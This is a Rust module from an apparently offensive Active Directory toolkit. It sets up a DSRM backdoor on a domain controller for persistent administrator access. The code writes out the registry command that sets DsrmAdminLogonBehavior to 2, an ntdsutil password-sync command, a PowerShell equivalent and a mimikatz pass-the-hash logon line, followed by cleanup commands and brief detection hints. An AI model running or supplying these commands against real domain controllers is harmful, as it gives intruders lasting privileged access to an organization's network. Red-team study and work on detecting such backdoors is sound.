//! DSRM (Directory Services Restore Mode) backdoor.
//!
//! Configures the DC to allow DSRM password for network logon,
//! providing a persistent backdoor via the local Administrator account.

use overthrone_core::error::{OverthroneError, Result};
use tracing::{info, warn};

use crate::runner::{ForgeConfig, ForgeResult, PersistenceResult};

/// Registry path for DSRM admin logon behavior
const DSRM_REG_PATH: &str = r"HKLM\System\CurrentControlSet\Control\Lsa";
const DSRM_REG_VALUE: &str = "DsrmAdminLogonBehavior";

/// Enable DSRM backdoor by setting DsrmAdminLogonBehavior=2.
///
/// When set to 2, the local DSRM Administrator account can authenticate
/// over the network using its own password (set during dcpromo).
/// This provides persistent admin access even if all domain passwords are changed.
pub async fn enable_dsrm_backdoor(config: &ForgeConfig) -> Result<ForgeResult> {
    info!("[dsrm] Enabling DSRM backdoor on {}", config.dc_ip);

    // DSRM backdoor requires:
    // 1. Admin access to the DC
    // 2. Modify registry: HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior = 2
    // 3. Optionally: sync the DSRM password to a known value using ntdsutil
    //
    // DsrmAdminLogonBehavior values:
    //   0 (default): DSRM admin can only log on in DSRM boot mode
    //   1: DSRM admin can log on if AD DS service is stopped
    //   2: DSRM admin can ALWAYS log on over the network (BACKDOOR!)

    // The commands to execute on the DC (via WMI/PSExec from overthrone-pilot):
    let reg_command = format!(
        "reg add \"{}\" /v {} /t REG_DWORD /d 2 /f",
        DSRM_REG_PATH, DSRM_REG_VALUE
    );

    // Optionally sync DSRM password to a known value
    let sync_command = "ntdsutil \"set dsrm password\" \"sync from domain account Administrator\" q q";

    // PowerShell alternative
    let ps_command = "New-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa' \
         -Name 'DsrmAdminLogonBehavior' -PropertyType DWORD -Value 2 -Force".to_string();

    let cleanup_cmd = format!(
        "# Remove DSRM backdoor:\n\
         reg delete \"{}\" /v {} /f\n\
         # Or via PowerShell:\n\
         Remove-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa' \
         -Name 'DsrmAdminLogonBehavior' -Force",
        DSRM_REG_PATH, DSRM_REG_VALUE
    );

    let details = format!(
        "DSRM Backdoor configuration for {}:\n\
         \n\
         Step 1 — Set registry value (run on DC with admin):\n\
         > {}\n\
         \n\
         Step 2 — (Optional) Sync DSRM password to domain admin:\n\
         > {}\n\
         \n\
         Step 3 — Use DSRM admin for network logon:\n\
         > sekurlsa::pth /user:Administrator /domain:{} /ntlm:<DSRM_HASH>\n\
         \n\
         PowerShell method:\n\
         > {}\n\
         \n\
         Detection:\n\
         - Monitor Event ID 4657 on registry key {}\n\
         - Monitor for local account logon (Event ID 4624, LogonType=3, not domain account)\n\
         - Check DsrmAdminLogonBehavior value regularly",
        config.dc_ip,
        reg_command,
        sync_command,
        config.dc_ip.split('.').next().unwrap_or(&config.dc_ip),
        ps_command,
        DSRM_REG_PATH,
    );

    info!("[dsrm] DSRM backdoor instructions generated");

    Ok(ForgeResult {
        action: "DSRM Backdoor".into(),
        domain: config.domain.clone(),
        success: true,
        ticket_data: None,
        persistence_result: Some(PersistenceResult {
            mechanism: "DSRM Administrator Network Logon".into(),
            target: config.dc_ip.clone(),
            success: true,
            details,
            cleanup_command: Some(cleanup_cmd),
        }),
        message: format!(
            "DSRM backdoor prepared for {} — set DsrmAdminLogonBehavior=2 for persistent access",
            config.dc_ip
        ),
    })
}
